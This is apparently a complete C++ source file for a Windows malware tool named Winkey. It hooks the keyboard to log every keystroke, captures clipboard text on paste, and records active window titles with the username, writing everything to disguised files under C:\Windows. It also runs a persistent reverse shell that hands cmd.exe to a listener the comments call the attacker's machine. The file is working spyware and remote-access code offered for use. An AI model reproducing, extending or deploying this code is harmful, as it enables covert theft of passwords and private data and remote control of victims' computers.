#include "Winkey.hpp"

HHOOK			key_hook;
HWINEVENTHOOK	win_hook;

FILE* file;

Winkey::Winkey(void)
{
	return;
}

Winkey::~Winkey(void)
{
	return;
}

void	handle_sig(int sig)
{
    (void)sig;
    UnhookWindowsHookEx(key_hook);
    UnhookWinEvent(win_hook);
}

void	_clipboard(void)
{
    FILE* log;
    HGLOBAL	clip;
    LPVOID str;

    if (!OpenClipboard(0))
        return;
    clip = GetClipboardData(CF_TEXT);
    if (clip)
    {
        str = GlobalLock(clip);
        if (str)
        {
            fopen_s(&log, "C:\\Windows\\ClipBoard.txt", "a");
            fprintf_s(log, "\n{CLIPBOARD: %s}\n", str);
            fclose(log);
        }
        GlobalUnlock(clip);
    }
    CloseClipboard();
}

LRESULT CALLBACK	LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT	key = (PKBDLLHOOKSTRUCT)lParam;
    static char			shift = 0;
    FILE* log;

    if (nCode == HC_ACTION)
    {
        if (wParam == WM_KEYUP)
        {
            if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
                shift = 0;
        }
        if (wParam == WM_KEYDOWN)
        {
            if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
                shift = 1;
            fopen_s(&log, "C:\\Windows\\WinNT.txt", "a");
            fprintf_s(log, "%s", keys[shift][key->vkCode]);
            fclose(log);
            if (GetKeyState(VK_CONTROL) && key->vkCode == 'V')
                _clipboard();
        }
    }
    return (CallNextHookEx(key_hook, nCode, wParam, lParam));
}

void CALLBACK	Wineventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
    LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
{
    SYSTEMTIME	time;
    int			len;
    HLOCAL title;
    FILE* log;

    (void)hWinEventHook;
    (void)idObject;
    (void)idChild;
    (void)idEventThread;
    (void)dwmsEventTime;
    if (event != EVENT_SYSTEM_FOREGROUND)
        return;
    len = GetWindowTextLength(hwnd) + 1;
    title = LocalAlloc(LMEM_ZEROINIT, len);
    if (!title)
        return;
    GetSystemTime(&time);
    GetWindowText(hwnd, LPSTR(title), len);
    if (!title)
        return;

    WCHAR username[256];
    DWORD usernameLen = sizeof(username) / sizeof(username[0]);
    GetUserNameW(username, &usernameLen);

    fopen_s(&log, "C:\\Windows\\WinNT.txt", "a+");
    fprintf_s(log, "\n[%02d.%02d.%d %02d:%02d:%02d] - %ls - '%s'\n", time.wDay,
        time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond, username, title);
    fclose(log);
    LocalFree(title);
}

DWORD WINAPI _keyLogger(LPVOID lpParam)
{
    (void)lpParam;

    MSG		msg;
    HANDLE	thread;

    //signal(SIGINT, handle_sig);
    key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    win_hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0,
        Wineventproc, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
    CloseHandle(thread);
    while (GetMessage(&msg, 0, 0, 0));

    return 0;
}

void	Winkey::startKeylogger(void)
{
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_keyLogger), NULL, 0, NULL) == NULL) {
        std::cerr << "CreateThread failed!" << std::endl;
    }
	return;
}



void    Winkey::startclipBoard(void)
{
    return;
}

DWORD WINAPI _reverseShell(LPVOID lpParam)
{
    (void)lpParam;
    // listener ip, port on attacker's machine
    char* ip = "127.0.0.1";
    short port = 4444;

    WSADATA wsaData;
    SOCKET wSock;
    sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    while (true) {
        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            // Handle WSAStartup failure
            std::cerr << "WSAStartup failed!" << std::endl;
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        // Create socket
        wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        if (wSock == INVALID_SOCKET) {
            //std::cerr << "Failed to create socket!" << std::endl;
            WSACleanup();
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        hax.sin_family = AF_INET;
        hax.sin_port = htons(port);
        hax.sin_addr.s_addr = inet_addr(ip);

        // Connect to remote host
        if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            std::cerr << "Failed to connect to remote host!" << std::endl;
            closesocket(wSock);
            WSACleanup();
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = STARTF_USESTDHANDLES;
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

        // Start cmd.exe with redirected streams
        if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)) {
            // Wait for the shell process to exit
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        // Cleanup and retry after a delay
        closesocket(wSock);
        WSACleanup();
        Sleep(1000);  // Sleep before retrying
    }
}

void	Winkey::startReverseShell(void)
{
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_reverseShell), NULL, 0, NULL) == NULL) {
        std::cerr << "CreateThread failed!" << std::endl;
    }
	return;
}